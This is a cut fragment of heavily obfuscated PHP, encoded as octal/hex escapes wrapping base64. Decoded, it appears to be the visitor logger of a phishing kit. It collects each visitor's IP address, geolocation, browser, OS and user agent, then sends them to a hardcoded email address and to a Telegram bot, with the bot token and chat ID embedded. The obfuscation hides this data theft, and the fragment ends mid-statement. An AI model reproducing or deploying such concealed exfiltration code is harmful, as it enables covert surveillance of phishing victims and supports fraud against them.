76\144\x32\154\165\x5a\x47\71\x33\x63\x79\x42\x75\144\x43\101\x32\114\x6a\x41\x76\x61\123\x63\x67\111\x43\101\x67\x49\x44\x30\53\x49\103\101\156\x56\62\x6c\x75\132\x47\71\63\143\171\x42\x57\141\x58\116\x30\131\123\143\x73\x44\121\x6f\x4a\111\x43\101\x67\x49\x43\101\147\x49\103\x41\147\111\x43\101\x67\111\103\101\x67\x49\x43\143\x76\144\x32\x6c\165\132\107\x39\x33\x63\x79\x42\165\144\103\x41\61\114\x6a\111\166\x61\123\x63\x67\x49\103\101\147\111\x44\x30\x2b\x49\x43\x41\156\126\62\x6c\x75\132\x47\x39\63\x63\171\102\x54\x5a\130\112\x32\x5a\130\111\x67\115\x6a\101\x77\115\x79\x39\131\125\x43\x42\x34\116\x6a\x51\156\114\101\x30\x4b\x43\123\101\147\x49\x43\x41\x67\111\x43\101\x67\x49\103\x41\147\111\103\101\x67\111\x43\x41\156\114\63\x64\160\x62\155\x52\x76\144\x33\115\147\x62\156\x51\147\116\x53\x34\170\114\62\x6b\156\x49\x43\101\147\111\103\101\71\x50\151\101\x67\x4a\61\x64\x70\x62\x6d\122\166\144\63\115\147\127\x46\101\156\114\101\60\x4b\103\x53\101\x67\111\x43\x41\x67\x49\x43\101\147\111\103\101\x67\x49\x43\101\147\111\x43\x41\x6e\x4c\x33\144\x70\x62\x6d\122\x76\144\x33\x4d\147\145\110\101\x76\141\123\143\x67\x49\103\x41\x67\111\103\x41\147\111\x43\x41\x39\120\151\101\x67\112\61\144\160\x62\155\x52\166\x64\63\115\147\x57\x46\101\156\x4c\x41\x30\x4b\x43\x53\101\147\111\103\101\147\111\x43\x41\x67\x49\103\x41\x67\111\103\101\147\111\x43\x41\x6e\x4c\x33\x64\160\x62\155\122\166\x64\x33\x4d\x67\x62\x6e\x51\147\x4e\x53\x34\x77\x4c\62\x6b\x6e\x49\103\101\147\111\103\x41\71\120\151\101\x67\112\x31\144\160\x62\x6d\122\x76\x64\x33\x4d\x67\x4d\152\101\x77\115\x43\x63\163\104\121\x6f\112\x49\103\101\147\x49\103\101\147\111\103\101\x67\111\103\x41\x67\x49\103\101\x67\x49\x43\143\x76\x64\62\x6c\165\132\107\71\63\143\171\x42\x74\132\x53\x39\x70\112\171\101\147\x49\103\x41\x67\111\103\x41\x67\x49\104\x30\53\111\x43\x41\156\x56\62\154\x75\x5a\107\71\x33\x63\171\102\x4e\122\123\143\x73\104\121\157\x4a\111\103\x41\147\x49\103\101\147\111\x43\x41\147\x49\103\x41\x67\x49\x43\x41\147\111\103\x63\x76\x64\x32\154\x75\117\x54\147\166\x61\123\143\x67\111\x43\101\x67\x49\x43\101\x67\x49\x43\x41\147\111\103\x41\x67\111\104\60\x2b\111\x43\x41\156\126\x32\x6c\165\132\107\x39\x33\x63\x79\x41\65\x4f\x43\143\163\104\121\x6f\x4a\x49\103\101\147\x49\x43\101\x67\x49\103\101\147\x49\103\x41\147\111\x43\x41\x67\x49\x43\x63\166\x64\x32\154\165\x4f\x54\x55\166\141\x53\143\x67\111\103\101\x67\111\x43\x41\x67\111\103\101\147\111\103\101\x67\111\x44\60\53\111\x43\101\x6e\126\62\154\x75\132\107\71\x33\143\171\101\x35\116\123\143\163\x44\x51\x6f\112\x49\103\x41\x67\111\103\x41\x67\111\103\101\147\x49\103\x41\x67\111\103\x41\147\111\103\143\x76\144\62\x6c\165\x4d\x54\x59\x76\x61\123\x63\147\x49\103\x41\x67\111\x43\101\147\111\103\101\147\111\103\x41\x67\x49\x44\60\53\x49\103\101\x6e\x56\62\x6c\x75\x5a\107\x39\63\x63\x79\101\x7a\x4c\152\105\170\x4a\171\x77\x4e\103\x67\153\x67\111\x43\x41\147\x49\103\x41\x67\111\x43\x41\x67\111\103\x41\147\111\x43\101\x67\x4a\171\x39\x74\131\127\x4e\160\x62\x6e\122\166\x63\x32\x68\70\x62\127\106\152\111\x47\x39\x7a\x49\x48\x67\x76\141\x53\143\147\x50\124\64\147\111\x43\x64\x4e\x59\x57\x4d\x67\124\x31\115\x67\x57\x43\143\x73\104\121\157\x4a\111\103\101\x67\x49\x43\101\147\x49\103\101\x67\111\103\101\x67\x49\x43\x41\x67\x49\103\x63\166\x62\127\x46\x6a\130\63\102\x76\x64\x32\x56\171\x63\x47\115\166\141\x53\143\147\x49\103\x41\147\x49\103\x41\147\111\x44\x30\53\111\x43\x41\156\x54\127\x46\x6a\111\x45\71\x54\x49\104\x6b\x6e\x4c\x41\60\x4b\x43\123\101\147\111\103\x41\147\x49\103\x41\x67\111\x43\101\147\111\x43\101\x67\x49\103\x41\x6e\x4c\62\x78\x70\x62\156\x56\x34\114\x32\x6b\x6e\x49\x43\x41\x67\x49\x43\101\147\x49\103\x41\x67\111\103\101\147\111\103\101\71\x50\x69\101\x67\x4a\60\170\160\142\156\126\64\x4a\x79\167\x4e\103\x67\153\x67\111\x43\101\x67\x49\103\x41\147\111\103\101\147\x49\103\x41\147\111\103\x41\x67\112\x79\71\x31\x59\156\126\165\x64\x48\125\x76\x61\x53\x63\x67\x49\x43\x41\x67\x49\x43\101\147\x49\103\x41\147\111\103\101\147\x50\x54\64\x67\x49\103\144\126\x59\x6e\x56\x75\x64\110\125\156\x4c\101\x30\113\103\123\101\147\x49\103\101\x67\x49\x43\x41\147\x49\x43\x41\x67\x49\x43\x41\147\111\x43\101\156\114\x32\x6c\x77\141\x47\71\x75\x5a\x53\x39\160\x4a\x79\x41\147\111\103\x41\147\111\x43\101\147\x49\103\101\147\x49\x43\x41\x39\x50\151\101\x67\112\62\x6c\121\141\107\71\165\x5a\x53\x63\163\x44\x51\157\112\x49\x43\x41\x67\x49\x43\101\147\111\x43\101\x67\111\103\x41\x67\111\103\x41\x67\x49\x43\x63\166\141\130\x42\x76\x5a\x43\x39\x70\112\x79\101\147\111\x43\101\147\x49\x43\x41\147\x49\x43\x41\x67\111\103\101\147\111\104\x30\x2b\111\x43\x41\x6e\x61\x56\102\x76\x5a\x43\143\x73\x44\121\x6f\x4a\111\x43\101\x67\111\x43\x41\147\x49\103\x41\147\x49\x43\x41\x67\x49\103\x41\x67\111\x43\x63\166\141\x58\x42\150\x5a\x43\71\160\x4a\x79\x41\x67\111\x43\101\x67\x49\x43\101\147\x49\103\101\x67\111\x43\101\x67\111\104\x30\x2b\x49\103\101\156\x61\x56\x42\x68\x5a\103\143\x73\x44\x51\157\x4a\111\103\101\147\x49\x43\x41\x67\x49\103\101\147\111\103\x41\147\111\103\x41\147\111\x43\143\166\x59\x57\65\x6b\x63\x6d\x39\160\132\103\x39\x70\x4a\x79\101\147\x49\103\x41\147\x49\x43\x41\147\111\103\101\147\x49\104\60\53\111\103\x41\x6e\121\x57\x35\153\x63\155\71\x70\132\x43\143\x73\x44\121\x6f\112\111\x43\x41\x67\111\103\101\147\111\x43\x41\147\x49\x43\101\147\x49\x43\x41\x67\x49\103\x63\x76\131\155\x78\x68\131\x32\x74\151\132\130\x4a\171\145\123\71\160\112\x79\x41\147\x49\103\101\147\111\103\101\x67\111\104\x30\53\x49\x43\101\156\121\155\170\x68\131\62\x74\103\x5a\x58\x4a\171\145\123\x63\x73\104\121\157\112\x49\x43\x41\147\111\103\x41\x67\111\x43\101\147\x49\103\x41\x67\x49\103\101\x67\111\103\x63\x76\144\x32\126\151\142\63\x4d\166\141\x53\x63\147\111\103\101\x67\111\x43\x41\x67\111\103\101\x67\x49\x43\x41\147\x49\x44\x30\53\x49\x43\101\x6e\x54\127\x39\151\x61\127\170\x6c\x4a\x79\153\x37\x44\121\x6f\147\111\x43\101\147\x5a\155\71\x79\132\127\106\152\x61\103\x41\157\x4a\x45\x39\x54\x49\107\x46\172\x49\103\122\171\132\127\144\154\x65\103\101\x39\x50\x69\x41\153\144\155\106\x73\144\x57\125\160\x49\110\163\x67\x44\x51\x6f\147\x49\103\x41\x67\x49\x43\101\x67\111\x47\x6c\x6d\111\103\150\167\x63\x6d\126\156\x58\x32\x31\150\144\x47\116\x6f\x4b\103\x52\x79\x5a\x57\x64\154\145\x43\167\147\112\x46\x56\x54\122\126\112\x66\x51\x55\144\106\x54\x6c\121\160\113\x53\x42\67\104\121\x6f\x67\x49\x43\101\147\x49\103\101\147\111\103\x41\147\111\x43\x41\153\x54\61\116\x66\122\126\112\x53\124\x31\x49\x67\120\123\101\153\144\x6d\x46\x73\x64\127\125\67\104\121\x6f\147\111\103\x41\x67\111\103\101\147\x49\110\60\116\103\147\x30\x4b\111\x43\101\x67\x49\110\60\147\111\103\x41\116\103\x69\x41\147\111\x43\x42\x79\132\x58\x52\61\143\x6d\x34\x67\x4a\x45\x39\124\130\60\126\123\125\x6b\71\x53\117\x77\60\x4b\x66\x51\x30\x4b\x5a\156\x56\x75\x59\63\122\x70\x62\62\64\147\127\x45\112\146\x51\x6e\112\166\144\63\x4e\x6c\143\x69\147\153\x56\126\116\x46\125\x6c\x39\102\122\x30\x56\117\126\103\154\x37\104\x51\157\112\112\105\x4a\123\x54\x31\144\124\x52\126\112\146\x52\x56\x4a\123\124\61\111\x67\x49\103\x41\x67\120\x53\x41\147\x49\x43\112\x56\x62\155\164\165\x62\63\x64\165\x49\105\112\x79\x62\63\144\x7a\x5a\130\x49\x69\117\x77\60\113\111\x43\101\x67\x49\x43\122\103\125\153\x39\x58\125\60\x56\123\111\x43\x41\x39\111\x43\101\147\x59\x58\112\x79\x59\x58\x6b\x6f\112\171\71\164\x63\62\154\x6c\114\62\x6b\x6e\x49\x43\x41\147\x49\103\x41\147\x49\104\60\x2b\111\103\101\x6e\123\x57\65\60\132\x58\x4a\165\x5a\130\121\147\x52\x58\x68\167\x62\107\x39\171\x5a\130\x49\156\114\101\x30\x4b\x49\103\x41\x67\111\103\x41\147\111\x43\101\x67\x49\x43\x41\x67\111\x43\101\x67\x49\103\101\x67\x49\103\x41\x67\111\x43\101\147\x4a\171\x39\155\x61\130\x4a\x6c\132\155\x39\64\114\62\x6b\x6e\111\103\101\147\111\x44\x30\x2b\111\x43\101\156\x52\155\x6c\x79\132\x57\132\x76\145\103\x63\163\x44\x51\157\147\111\x43\101\x67\111\x43\x41\147\x49\103\101\x67\x49\x43\101\147\111\x43\x41\147\111\103\x41\147\111\103\x41\x67\x49\x43\101\x6e\114\x33\116\x68\x5a\155\x46\171\x61\x53\71\160\x4a\x79\101\147\x49\103\x41\147\120\124\x34\147\x49\x43\x64\124\131\127\132\x68\x63\155\153\156\x4c\101\x30\x4b\x49\x43\x41\147\x49\x43\101\147\x49\x43\x41\147\111\x43\x41\147\111\x43\101\x67\x49\x43\101\147\x49\103\101\x67\x49\x43\101\147\x4a\171\71\x6a\141\x48\112\166\142\127\x55\166\141\x53\x63\147\x49\103\x41\x67\111\104\60\53\x49\103\101\x6e\x51\x32\x68\x79\x62\62\61\154\x4a\x79\167\x4e\x43\151\x41\x67\111\x43\101\147\111\x43\101\147\111\103\x41\x67\x49\103\x41\x67\111\x43\101\147\111\103\x41\147\x49\x43\101\x67\111\103\x63\x76\132\x57\x52\x6e\132\x53\71\x70\x4a\x79\x41\147\x49\x43\101\147\x49\x43\101\71\120\151\101\x67\x4a\60\126\x6b\x5a\x32\125\x6e\x4c\x41\60\113\111\x43\x41\x67\111\103\101\147\111\103\101\x67\111\103\x41\147\111\x43\101\x67\111\103\101\x67\111\x43\101\x67\111\103\101\x67\x4a\x79\x39\x76\x63\107\x56\171\131\x53\71\x70\x4a\171\101\147\111\x43\101\147\x49\104\x30\53\x49\103\x41\x6e\124\63\x42\154\x63\155\x45\156\114\101\x30\x4b\111\x43\x41\147\x49\x43\101\x67\x49\103\x41\147\111\x43\x41\x67\x49\x43\101\x67\111\103\101\147\111\103\x41\147\111\x43\x41\x67\112\171\x39\x75\132\130\122\172\131\62\106\x77\x5a\x53\71\160\112\171\101\x67\111\104\x30\53\x49\103\x41\156\124\x6d\x56\60\x63\62\116\150\x63\107\x55\x6e\x4c\101\x30\x4b\111\103\x41\147\x49\103\101\147\x49\103\x41\x67\x49\x43\x41\147\x49\x43\x41\x67\111\x43\x41\x67\111\103\101\x67\x49\103\101\x67\x4a\171\x39\x74\x59\x58\150\60\141\107\71\165\x4c\62\153\x6e\x49\x43\101\x67\111\104\60\53\111\x43\x41\x6e\124\127\x46\x34\144\107\x68\x76\142\151\x63\163\x44\x51\157\147\x49\103\101\x67\x49\103\x41\x67\x49\x43\x41\147\111\103\101\x67\x49\103\x41\x67\111\x43\101\147\x49\103\x41\147\x49\x43\x41\156\x4c\x32\164\x76\142\156\x46\61\x5a\x58\x4a\x76\x63\151\x39\x70\x4a\171\101\x67\120\x54\64\x67\x49\103\x64\x4c\x62\62\65\x78\144\127\126\171\x62\63\111\156\114\x41\x30\x4b\111\x43\101\x67\111\103\101\147\x49\x43\x41\147\111\x43\x41\x67\x49\x43\x41\147\111\x43\x41\x67\111\x43\101\147\111\103\x41\x67\x4a\x79\x39\164\142\62\112\x70\142\x47\x55\x76\x61\x53\143\147\111\103\x41\147\111\x44\x30\53\x49\x43\101\156\x53\107\106\165\x5a\107\x68\x6c\142\x47\x51\147\121\156\112\166\x64\63\116\x6c\x63\151\143\160\x4f\167\60\113\111\103\x41\147\111\107\132\166\x63\x6d\126\150\x59\62\147\147\113\x43\x52\103\125\153\71\130\x55\60\126\123\x49\x47\106\172\111\103\x52\171\x5a\127\144\154\x65\103\x41\71\120\x69\101\153\x64\x6d\x46\x73\144\127\125\160\x49\110\x73\x67\104\x51\157\x67\x49\103\x41\x67\111\x43\101\147\111\x47\x6c\x6d\x49\x43\150\x77\x63\x6d\x56\x6e\x58\x32\61\x68\x64\107\116\x6f\x4b\x43\122\171\x5a\x57\144\x6c\145\x43\167\147\x4a\106\126\124\122\126\112\x66\121\x55\x64\106\x54\x6c\121\160\113\123\x42\x37\x44\x51\x6f\147\111\x43\x41\147\111\x43\101\x67\x49\103\x41\147\111\103\101\x6b\121\x6c\112\x50\126\61\x4e\106\x55\x6c\x39\x46\x55\x6c\x4a\120\x55\x69\101\71\111\103\122\x32\131\127\170\x31\132\x54\163\x4e\x43\151\x41\x67\x49\103\x41\x67\x49\x43\x41\x67\146\x51\x30\x4b\x49\103\101\x67\111\110\60\x4e\103\151\101\x67\x49\x43\102\x79\132\130\122\61\x63\x6d\64\x67\x4a\x45\x4a\123\124\61\x64\124\x52\126\x4a\146\122\126\112\x53\x54\61\111\67\104\x51\160\71\104\121\160\153\131\x58\x52\154\130\x32\122\x6c\x5a\x6d\x46\x31\x62\110\122\146\x64\107\x6c\164\x5a\x58\160\166\x62\155\126\x66\143\62\126\60\113\103\x64\x48\x54\x56\121\156\x4b\x54\163\x4e\103\151\x52\x6b\131\130\122\154\x49\104\x30\147\x5a\x47\106\x30\x5a\123\x67\x69\x5a\x43\x42\116\x4c\103\x42\x5a\111\x69\x6b\x37\104\121\x6f\153\x64\x47\154\x74\x5a\x53\101\71\111\x47\x52\150\144\x47\x55\157\x49\155\143\x36\141\123\102\150\111\x69\x6b\x37\104\x51\157\153\x64\x58\x4e\x6c\143\155\x46\156\132\127\x35\x30\x49\104\60\x67\112\106\71\124\122\x56\112\127\x52\x56\x4a\x62\112\x30\150\x55\x56\106\x42\x66\126\126\116\x46\125\154\x39\x42\122\x30\x56\x4f\126\103\x64\x64\x4f\167\60\113\112\x48\x4e\146\143\x47\x46\60\x61\103\x41\71\111\x43\112\x6f\x64\x48\x52\x77\x4f\x69\70\x76\x49\x69\101\x75\x49\103\122\146\x55\x30\x56\x53\126\153\x56\123\x57\171\144\x54\x52\x56\x4a\x57\122\x56\x4a\x66\x54\x6b\x46\x4e\122\x53\144\144\x4f\167\x30\x4b\112\x48\x68\x66\143\x47\106\60\141\103\x41\71\x49\103\112\x6f\144\x48\122\167\117\151\70\166\111\151\x41\x75\111\103\x52\x66\x55\60\x56\123\x56\153\126\x53\127\171\x64\x54\x52\x56\x4a\127\122\126\x4a\146\x54\x6b\x46\116\x52\123\144\144\111\x43\64\x67\112\x46\71\124\122\x56\x4a\127\x52\126\x4a\x62\112\61\x4a\x46\125\126\126\106\125\x31\x52\146\x56\x56\x4a\x4a\x4a\x31\60\67\104\121\157\153\x53\x56\102\125\127\x69\x41\x39\x49\107\144\x6c\x64\x47\126\x75\x64\x69\147\151\x55\153\x56\x4e\x54\61\x52\x46\130\60\106\x45\x52\106\x49\x69\x4b\x54\163\x4e\103\x69\x52\x44\x54\61\126\117\x56\106\x4a\x5a\x56\106\157\x67\120\x53\x42\x7a\141\x57\61\167\x62\x47\126\64\x62\127\x78\x66\142\x47\x39\150\132\x46\71\x6d\x61\x57\170\154\x4b\103\x4a\157\x64\110\x52\167\x4f\x69\70\166\x64\63\x64\x33\x4c\x6d\144\154\142\x33\102\x73\x64\x57\144\x70\142\151\x35\165\132\130\121\x76\x65\107\x31\x73\114\155\x64\x77\120\62\154\167\120\x53\x52\112\x55\106\122\x61\x49\151\153\67\x44\121\x6f\153\121\x30\71\126\124\x6c\122\x53\x57\123\101\x39\111\x43\122\104\124\61\126\117\126\106\x4a\132\x56\x46\157\164\x50\155\144\154\142\63\102\163\x64\127\x64\x70\x62\x6c\71\152\x62\x33\126\x75\x64\110\112\x35\124\155\x46\164\x5a\124\163\116\x43\x69\122\x44\123\126\122\x5a\111\x44\60\147\112\x45\x4e\120\x56\x55\65\125\125\154\154\x55\127\x69\60\53\x5a\62\126\x76\x63\x47\170\x31\x5a\62\154\x75\130\62\x4e\x70\144\110\153\x37\x44\x51\157\x6b\x55\153\x56\110\x53\x55\71\x4f\x49\x44\x30\147\112\x45\x4e\120\x56\x55\x35\125\125\154\154\125\127\151\60\x2b\x5a\62\x56\166\x63\107\x78\x31\x5a\62\154\x75\130\x33\112\x6c\132\x32\154\x76\x62\152\163\116\103\x69\122\x44\130\60\116\x50\x52\x45\x55\147\x50\x53\101\153\x51\60\71\126\124\154\x52\x53\x57\x56\x52\x61\x4c\x54\65\x6e\x5a\x57\x39\167\x62\110\x56\156\x61\x57\x35\x66\x59\x32\x39\165\144\110\112\65\x59\x32\71\x6b\132\x54\163\x4e\103\151\122\x55\141\x57\x31\x6c\x65\155\71\165\x5a\x53\101\x39\111\103\122\x44\124\x31\126\117\x56\x46\x4a\x5a\126\106\x6f\164\x50\x6d\x64\154\x62\63\102\163\144\x57\x64\x70\142\154\71\60\141\x57\61\154\x65\155\71\x75\132\x54\x73\x4e\103\x69\x52\x54\x65\x57\61\151\x62\x32\x77\147\120\x53\101\x6b\121\x30\71\x56\124\x6c\x52\123\127\x56\122\x61\114\x54\65\x6e\x5a\x57\71\x77\142\x48\126\156\x61\127\65\x66\x59\x33\126\x79\143\x6d\x56\165\x59\x33\x6c\172\x65\127\x31\151\142\x32\167\x37\104\x51\157\x6b\x62\x57\126\172\x63\62\106\x6e\132\x53\101\147\x50\123\x41\x69\146\x43\x30\x74\x4c\123\164\142\124\153\126\130\x34\64\103\121\x38\x4a\x2b\x52\161\x4f\113\101\152\x66\x43\146\153\162\x76\x6a\147\112\x46\116\114\61\116\x64\113\x79\x30\164\114\130\170\143\x62\151\111\67\x44\x51\x6f\x6b\142\x57\x56\172\143\62\x46\x6e\132\123\101\165\120\123\x41\x69\127\x79\x74\x64\64\x70\123\x42\64\160\123\102\64\160\123\102\x34\160\x53\102\x34\64\x43\121\70\x4a\53\122\160\117\x4f\x41\153\x65\113\x55\x67\x65\113\125\147\145\113\x55\x67\x65\113\125\147\x56\x73\162\x58\x56\170\x75\x49\x6a\163\x4e\103\x69\122\x74\x5a\x58\116\172\x59\x57\x64\x6c\111\103\x34\71\111\x43\x4c\x6a\x67\112\x44\167\x6e\x34\53\147\64\64\103\x52\x53\126\101\112\117\x69\x41\x69\114\151\x52\112\x55\106\x52\x61\x4c\151\x4a\x63\142\x69\x49\x37\x44\x51\x6f\x6b\142\127\x56\172\143\62\x46\x6e\x5a\123\x41\x75\x50\x53\x41\x69\x34\64\x43\121\70\112\53\x54\156\53\x4f\x41\x6b\x56\116\x35\143\63\x52\x6c\x62\123\x41\x36\x49\x43\111\x75\127\105\x4a\146\x54\x31\x4d\x6f\112\106\x39\124\122\126\x4a\127\122\126\x4a\142\x4a\x30\x68\125\126\x46\x42\146\126\x56\116\x46\125\154\71\x42\x52\x30\126\x4f\126\x43\144\x64\x4b\123\64\151\x58\107\64\x69\117\x77\x30\x4b\112\107\x31\x6c\143\63\116\150\x5a\x32\x55\147\114\152\60\x67\111\165\x4f\101\153\x50\x43\x66\152\111\x7a\152\147\x4a\x46\103\143\x6d\x39\x33\x63\62\x56\171\x49\x44\157\x67\x49\151\x35\x59\121\x6c\x39\103\x63\x6d\x39\x33\x63\62\x56\x79\113\103\x52\x66\x55\60\x56\x53\x56\153\x56\123\127\171\x64\x49\x56\106\x52\121\130\61\x56\124\122\x56\112\146\x51\125\x64\106\124\154\x51\x6e\x58\123\x6b\165\111\x6c\170\165\x49\152\x73\x4e\x43\x69\122\x74\132\x58\116\x7a\x59\x57\144\154\x49\103\x34\x39\111\103\114\x6a\x67\112\104\x69\x6e\x4b\x6a\x6a\147\x4a\106\x56\x63\62\126\171\111\x45\106\x6e\x5a\x57\x35\60\x49\x44\x6f\x67\x49\x69\64\x6b\144\x58\x4e\154\143\155\x46\x6e\132\x57\x35\x30\x4c\151\x4a\x63\x62\x69\x49\67\104\x51\x6f\x6b\x62\x57\x56\x7a\x63\x32\106\156\x5a\x53\101\x75\x50\x53\x41\151\x57\x79\164\144\64\160\x53\102\x34\160\x53\x42\x34\160\x53\x42\64\160\x53\102\64\64\x43\121\x38\x4a\53\x56\x74\x65\53\x34\x6a\x2b\x4f\101\x6b\145\x4b\125\147\145\x4b\x55\147\x65\x4b\125\147\145\113\x55\147\x56\x73\162\x58\126\170\165\x49\x6a\x73\x4e\x43\x69\x52\164\132\130\116\x7a\131\x57\x64\x6c\x49\x43\x34\x39\x49\x43\x4c\152\x67\x4a\x44\x77\x6e\x34\x79\x51\x34\64\103\122\126\x47\154\x74\132\123\102\141\142\62\65\154\111\104\157\x67\x49\x69\64\x6b\126\107\x6c\x74\x5a\130\160\166\x62\155\125\165\x49\x6c\170\165\x49\x6a\163\x4e\x43\151\x52\164\x5a\130\116\x7a\131\127\144\154\x49\x43\x34\x39\x49\x43\x4c\152\147\112\x44\x77\156\x34\x79\x51\x34\64\103\122\x51\x32\x39\61\142\156\x52\x79\x65\x53\x41\x36\x49\x43\x49\165\112\105\x4e\x50\126\125\x35\125\x55\154\153\x75\111\x6c\x78\x75\x49\x6a\163\116\x43\151\122\x74\x5a\x58\116\x7a\x59\127\x64\154\111\103\x34\71\111\x43\x4c\x6a\147\112\x44\x77\156\x34\171\x51\64\64\103\122\x55\x6d\x56\156\x61\127\x39\x75\111\x44\x6f\x67\x49\151\x34\153\125\x6b\126\x48\x53\125\x39\x4f\x4c\151\112\143\142\151\x49\67\x44\x51\x6f\153\x62\127\126\172\x63\62\x46\x6e\x5a\x53\101\165\120\123\x41\x69\x34\64\103\x51\x38\112\53\115\x6b\x4f\x4f\x41\153\125\x4e\160\x64\110\x6b\147\x4f\151\101\x69\x4c\151\122\x44\x53\x56\122\132\114\x69\x4a\x63\x62\x69\x49\67\x44\121\x6f\x6b\142\x57\126\172\x63\x32\106\156\132\x53\101\x75\x50\x53\101\x69\127\171\x74\144\x34\160\x53\x42\64\160\123\x42\x34\x70\123\102\x34\x70\123\102\64\x34\103\121\70\x4a\53\x53\165\53\117\101\x6b\145\x4b\125\x67\x65\x4b\125\x67\145\x4b\125\x67\x65\x4b\x55\147\x56\163\162\x58\126\x78\x75\111\152\x73\116\x43\151\x52\x74\x5a\130\x4e\172\131\127\x64\154\x49\x43\x34\71\x49\x43\114\x6a\147\x4a\104\167\156\65\x47\102\64\64\x43\122\123\x47\71\x7a\x64\x43\x41\66\x49\x43\111\x75\112\x48\x4e\x66\143\107\x46\60\141\103\64\151\x58\107\x34\151\x4f\x77\60\x4b\112\x47\61\154\143\63\116\150\132\x32\x55\x67\x4c\152\60\x67\111\x75\117\101\x6b\x50\x43\146\x6b\x59\x44\152\x67\112\x46\107\x61\x57\170\154\111\104\x6f\x67\x49\151\64\153\145\106\71\167\x59\130\x52\x6f\114\151\x4a\x63\x62\x69\x49\x37\104\x51\x6f\x6b\142\127\x56\x7a\143\x32\x46\x6e\x5a\x53\x41\x75\x50\123\x41\x69\127\x79\164\144\x34\x70\123\x42\x34\x70\123\x42\64\x70\123\x42\64\x70\x53\102\x34\64\103\x51\x34\x6f\x2b\x7a\64\64\x43\x52\64\x70\123\x42\64\x70\123\x42\64\160\123\102\x34\160\123\102\x57\171\x74\x64\x58\107\x34\x69\x4f\167\60\113\112\107\61\154\143\63\116\150\x5a\x32\125\147\114\x6a\x30\147\111\x75\117\101\x6b\117\x4b\x4d\155\x75\53\64\x6a\53\117\101\x6b\126\x52\x70\x62\x57\x55\112\x4f\x69\x41\151\x4c\151\x52\x30\141\x57\x31\154\x4c\151\112\x63\x62\151\111\x37\104\121\157\153\x62\x57\x56\172\x63\x32\x46\156\x5a\x53\x41\x75\x50\x53\x41\151\64\64\x43\x51\x38\112\x2b\124\150\145\117\101\153\125\122\x68\x64\x47\x55\112\117\x69\x41\151\114\151\x52\153\x59\130\122\x6c\114\x69\x4a\x63\142\x69\111\x37\x44\x51\157\x6b\x62\x57\126\x7a\143\62\106\156\x5a\123\x41\x75\120\123\101\x69\127\171\x74\144\64\x70\123\x42\64\160\123\x42\x34\160\123\102\x34\160\x53\102\64\64\x43\121\70\x4a\53\125\152\145\117\101\153\145\x4b\125\147\145\113\x55\x67\x65\x4b\x55\x67\145\x4b\x55\147\x56\x73\162\130\126\170\x75\x49\x6a\x73\116\x43\x69\122\x74\x5a\x58\x4e\x7a\x59\x57\x64\x6c\x49\103\x34\71\111\103\x4c\152\x67\112\104\x77\x6e\x35\x4f\x68\64\64\x43\122\126\110\x4a\x68\x59\62\x73\x67\123\x56\101\147\117\x69\x42\157\x64\x48\x52\167\x63\x7a\x6f\x76\x4c\63\144\63\x64\x79\x35\160\x63\x43\61\x30\x63\x6d\x46\x6a\141\x32\x56\x79\x4c\x6d\71\x79\132\171\x39\x73\x62\62\71\162\144\130\x41\x75\x63\107\150\167\120\62\154\x77\120\123\x49\165\112\x45\154\x51\126\106\x6f\165\x49\154\x78\165\x49\x6a\163\x4e\103\x69\122\x74\132\x58\x4e\172\x59\127\x64\x6c\111\x43\x34\x39\x49\103\x4a\x38\120\124\60\71\x4b\x31\166\167\x6e\65\x4b\127\x51\153\x4d\x75\x52\106\114\x77\156\65\x4b\x57\130\123\x73\71\120\124\61\x38\x58\107\x34\x69\117\x77\60\x4b\x4a\x48\112\x6c\131\62\126\160\144\x6d\x56\x79\121\x57\122\153\x63\155\x56\172\x63\x79\x41\71\111\103\x4a\x72\x59\127\170\x70\x65\x44\x42\64\131\127\170\x70\141\60\102\156\142\x57\x46\160\142\x43\65\x6a\142\x32\60\x69\x4f\x77\x30\x4b\112\x46\x52\120\x53\x30\126\117\x49\x44\x30\x67\111\152\125\x79\116\x6a\147\60\x4d\x44\x45\x35\117\x54\115\x36\121\125\x46\106\115\x56\x41\60\x59\172\x56\121\123\x47\126\x53\121\x31\122\x48\x59\x32\x45\167\x54\105\164\x61\123\x56\x64\66\142\x53\61\x35\145\x56\154\x6c\115\x31\154\x6a\121\172\x51\x69\x4f\x77\x30\x4b\x4a\x45\116\111\121\126\x52\x66\123\x55\121\x67\x50\123\101\x69\x4d\x54\x67\65\116\152\121\62\116\x44\x49\x35\x4e\x53\x49\67\104\x51\x6f\x6b\143\x33\126\x69\141\x6d\x56\x6a\144\x43\101\147\x50\x53\101\151\70\x4a\53\x53\x6c\153\65\154\x64\57\x43\146\x6b\x61\122\x62\124\x53\x39\x54\130\x66\103\x66\153\x61\122\70\x38\112\x2b\115\153\105\132\171\115\x47\x30\66\111\x69\64\x6b\x53\126\102\x55\x57\151\x34\151\x38\112\x2b\123\154\x69\x49\67\x44\121\160\164\131\x57\x6c\163\113\103\122\x79\x5a\x57\116\x6c\141\130\132\154\143\x6b\106\x6b\132\x48\112\154\x63\x33\x4d\163\112\x48\x4e\x31\x59\155\160\154\x59\63\121\x73\112\107\x31\x6c\143\63\x4e\x68\132\62\125\160\117\x77\x30\x4b\132\x6d\154\x73\132\x56\71\156\132\130\x52\x66\x59\62\71\x75\144\x47\126\x75\x64\110\115\157\111\x6d\x68\x30\144\x48\102\x7a\x4f\151\x38\166\x59\x58\x42\160\x4c\156\122\x6c\x62\107\126\156\143\155\x46\x74\x4c\x6d\71\x79\x5a\x79\71\151\142\x33\x51\x69\114\x69\x52\125\124\60\x74\x46\x54\x69\x34\x69\114\x33\x4e\x6c\142\155\x52\x4e\132\130\x4e\172\131\x57\x64\x6c\120\62\x4e\x6f\x59\x58\x52\146\x61\127\x51\71\111\151\64\x6b\x51\x30\x68\x42\126\106\71\112\122\103\64\151\x4a\156\x52\x6c\145\x48\121\x39\x49\x69\101\165\111\x48\x56\171\142\x47\126\x75\131\62\x39\153\132\123\x67\153\142\x57\x56\172\x63\x32\x46\x6e\132\x53\x6b\165\x49\x69\x49\x67\113\x54\163")); goto poEqs; Y9K52: 